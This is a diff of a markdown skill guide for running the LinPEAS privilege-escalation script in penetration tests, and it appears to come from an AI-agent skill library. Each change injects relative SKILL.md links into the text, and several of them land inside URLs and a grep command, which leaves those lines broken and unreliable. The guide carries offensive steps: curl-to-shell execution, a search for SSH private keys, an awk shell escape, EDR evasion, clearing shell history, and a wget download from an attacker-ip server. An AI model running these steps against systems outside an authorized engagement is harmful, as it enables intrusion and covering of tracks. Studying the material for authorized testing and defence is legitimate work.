@@ -37,10 +37,10 @@ LinPEAS (Linux Privilege Escalation Awesome Script) is the most comprehensive au
 
 ```bash
 # Download and run LinPEAS directly (no-install, in-memory)
-curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+curl -L https://[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # Save output for analysis
-curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
+curl -L https://[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas_output.txt
 
@@ -113,7 +113,7 @@ See [../../../Global_References/privesc_vectors.md](../../../Global_References/p
 ```bash
 sudo -l
 # Look for: NOPASSWD entries, unrestricted shells, wildcard abuse
-# GTFOBins: https://gtfobins.github.io/
+# GTFOBins: https://gtfobins.[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).io/
 ```
 
 **SUID Binaries**
@@ -151,7 +151,7 @@ find / -name "id_rsa" -o -name "id_ecdsa" 2>/dev/null
 
 ```bash
 # Detect container environment
-cat /proc/1/cgroup | grep -i docker
+cat /proc/1/cgroup | grep -i [docker](../../DevOps_and_Cloud/Containers_and_Orchestration/docker/SKILL.md)
 ls /.dockerenv 2>/dev/null
 env | grep -i kube
 
@@ -166,7 +166,7 @@ See [../../../Global_References/mitre_mapping.md](../../../Global_References/mit
 
 - **Authorization**: Obtain explicit written authorization before running. Document engagement scope.
 - **Sensitive Data**: LinPEAS output contains credentials, hashes, and keys — treat as highly sensitive. Encrypt at rest, delete after engagement.
-- **Audit Logging**: Log all commands executed with timestamps in engagement notes. Some blue teams monitor for LinPEAS signatures.
+- **[Audit](../../AI_and_Agents/Operations/audit/SKILL.md) Logging**: Log all commands executed with timestamps in engagement notes. Some blue teams monitor for LinPEAS signatures.
 - **OPSEC**: In red team engagements, consider evasion — see references for obfuscation techniques. Run from tmpfs (`/dev/shm`) to avoid disk artifacts.
 - **Cleanup**: Remove LinPEAS binary and output files after the engagement. Clear relevant shell history entries.
 - **Compliance**: Activities must comply with engagement rules of engagement, SOW, and applicable laws (CFAA, Computer Misuse Act, etc.).
@@ -189,7 +189,7 @@ See [../../../Global_References/mitre_mapping.md](../../../Global_References/mit
 ## Integration Points
 
 - **Post-Metasploit**: Run after initial Meterpreter shell via `shell` command or `post/multi/manage/shell_to_meterpreter`
-- **Post-Nmap**: Use after `recon-nmap` identifies live Linux targets
+- **Post-Nmap**: Use after `[recon-nmap](../recon-nmap/SKILL.md)` identifies live Linux targets
 - **CI/CD Security Testing**: Integrate into automated purple team pipelines to validate privilege escalation mitigations
 - **Reporting**: Feed `linpeas_runner.py` JSON output into CVSS scoring and risk documentation
 
@@ -197,12 +197,12 @@ See [../../../Global_References/mitre_mapping.md](../../../Global_References/mit
 
 ### Issue: AV or EDR blocks LinPEAS execution
 
-**Solution**: Use the Python/PSPY alternative or compile a custom version.
+**Solution**: Use the [Python](../../Software_Engineering_and_Other/Languages/python/SKILL.md)/PSPY alternative or compile a custom version.
 ```bash
 # Run from memory (no disk write)
 curl -sL <url> | bash
 
-# Or use pspy for process monitoring only
+# Or use pspy for process [monitoring](../../DevOps_and_Cloud/Observability_and_SecOps/monitoring/SKILL.md) only
 ./pspy64
 ```
 
@@ -220,7 +220,7 @@ awk 'BEGIN {system("/bin/bash")}'
 
 **Solution**: Transfer LinPEAS via the attacker machine.
 ```bash
-# On attacker (Python HTTP server)
+# On attacker ([Python](../../Software_Engineering_and_Other/Languages/python/SKILL.md) HTTP server)
 python3 -m http.server 8080
 
 # On target
@@ -229,10 +229,10 @@ wget http://<attacker-ip>:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh &
 
 ## References
 
-- [LinPEAS GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
-- [HackTricks Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
-- [GTFOBins](https://gtfobins.github.io/)
+- [LinPEAS GitHub](https://[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).com/peass-ng/PEASS-ng/tree/master/linPEAS)
+- [HackTricks Linux Privesc](https://book.hacktricks.xyz/[linux-hardening](../../DevOps_and_Cloud/Observability_and_SecOps/linux-hardening/SKILL.md)/privilege-escalation)
+- [GTFOBins](https://gtfobins.[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).io/)
 - [MITRE ATT&CK TA0004 Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
 - [MITRE ATT&CK TA0007 Discovery](https://attack.mitre.org/tactics/TA0007/)
-- [PayloadsAllTheThings Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
+- [PayloadsAllTheThings Linux Privesc](https://[github](../../DevOps_and_Cloud/CI_CD/github/SKILL.md).com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 
